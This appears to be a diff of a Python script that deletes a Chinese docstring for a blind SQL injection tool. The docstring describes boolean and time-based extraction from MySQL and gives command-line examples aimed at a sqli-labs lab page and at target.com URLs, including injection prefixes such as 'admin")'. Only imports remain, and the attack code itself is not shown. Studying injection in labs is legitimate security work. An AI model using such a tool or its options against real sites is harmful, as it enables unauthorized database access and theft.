@@ -1,22 +1,4 @@
 #!/usr/bin/env python3
-"""
-SQL 盲注工具 — 支持布尔盲注 / 时间盲注
-MySQL 聚焦，二分法逐字符爆破，并发加速，断点续传
-
-用法示例:
-  # 布尔盲注（自动检测注入点）
-  python sql盲注.py -u http://127.0.0.1/sqli-labs-master/Less-16/ \\
-      --data "uname=*&passwd=1&submit=Submit" --technique B
-
-  # 时间盲注 + 并发
-  python sql盲注.py -u http://target.com/page.php \\
-      --data "id=*" --method GET --technique T --threads 4
-
-  # 指定注入前后缀 + 断点续传
-  python sql盲注.py -u http://target.com/login.php \\
-      --data "user=*&pass=1" --prefix 'admin")' --suffix "#" --resume
-"""
-
 import requests
 import time
 import json
